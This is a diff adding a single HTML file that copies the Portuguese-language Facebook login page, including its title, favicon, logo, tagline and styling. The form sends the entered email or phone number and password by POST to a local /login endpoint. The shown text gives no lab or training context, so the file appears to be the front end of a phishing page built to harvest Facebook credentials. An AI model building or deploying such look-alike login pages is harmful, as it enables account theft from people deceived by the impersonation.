@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Facebook - inicia sessão ou regista-te</title>
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'><path fill='%231877F2' d='M24 4C12.95 4 4 12.95 4 24c0 10 7.33 18.29 16.91 19.74V30.94h-5.09V24h5.09v-5.25c0-5.02 2.99-7.79 7.56-7.79 2.19 0 4.48.39 4.48.39v4.92h-2.52c-2.48 0-3.26 1.54-3.26 3.12V24h5.55l-.89 6.94h-4.66v12.8C36.67 42.29 44 34 44 24c0-11.05-8.95-20-20-20z'/></svg>" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    body {
+      font-family: Helvetica, Arial, sans-serif;
+      background: #f0f2f5;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    
+    .container {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      max-width: 1000px;
+      width: 100%;
+      gap: 100px;
+    }
+    
+    .left {
+      flex: 1;
+    }
+    
+    .logo {
+      font-size: 56px;
+      color: #1877f2;
+      font-weight: bold;
+      margin-bottom: 16px;
+    }
+    
+    .tagline {
+      font-size: 28px;
+      color: #1c1e21;
+      line-height: 32px;
+    }
+    
+    .right {
+      flex: 1;
+    }
+    
+    .card {
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+      padding: 20px;
+      max-width: 396px;
+    }
+    
+    input {
+      width: 100%;
+      padding: 14px 16px;
+      font-size: 17px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      margin-bottom: 12px;
+      outline: none;
+    }
+    
+    input:focus {
+      border-color: #1877f2;
+      box-shadow: 0 0 0 2px #e7f3ff;
+    }
+    
+    .btn-login {
+      width: 100%;
+      padding: 14px 16px;
+      background: #1877f2;
+      color: #fff;
+      font-size: 20px;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-bottom: 16px;
+    }
+    
+    .btn-login:hover {
+      background: #166fe5;
+    }
+    
+    .forgot {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    
+    .forgot a {
+      color: #1877f2;
+      text-decoration: none;
+      font-size: 14px;
+    }
+    
+    .forgot a:hover {
+      text-decoration: underline;
+    }
+    
+    .divider {
+      border-top: 1px solid #dadde1;
+      margin: 20px 0;
+    }
+    
+    .btn-create {
+      display: block;
+      margin: 0 auto;
+      padding: 14px 16px;
+      background: #42b72a;
+      color: #fff;
+      font-size: 17px;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      text-decoration: none;
+    }
+    
+    .btn-create:hover {
+      background: #36a420;
+    }
+    
+    @media (max-width: 900px) {
+      .container {
+        flex-direction: column;
+        gap: 40px;
+        text-align: center;
+      }
+      
+      .logo {
+        font-size: 48px;
+      }
+      
+      .tagline {
+        font-size: 24px;
+      }
+      
+      .card {
+        margin: 0 auto;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="left">
+      <div class="logo">facebook</div>
+      <p class="tagline">O Facebook ajuda-te a comunicar e a partilhar com as pessoas que fazem parte da tua vida.</p>
+    </div>
+    
+    <div class="right">
+      <div class="card">
+        <form method="POST" action="/login">
+          <input type="text" name="username" placeholder="Email ou número de telemóvel" required />
+          <input type="password" name="password" placeholder="Palavra-passe" required />
+          <button type="submit" class="btn-login">Iniciar sessão</button>
+        </form>
+        
+        <div class="forgot">
+          <a href="#">Esqueceste-te da palavra-passe?</a>
+        </div>
+        
+        <div class="divider"></div>
+        
+        <a href="#" class="btn-create">Criar nova conta</a>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
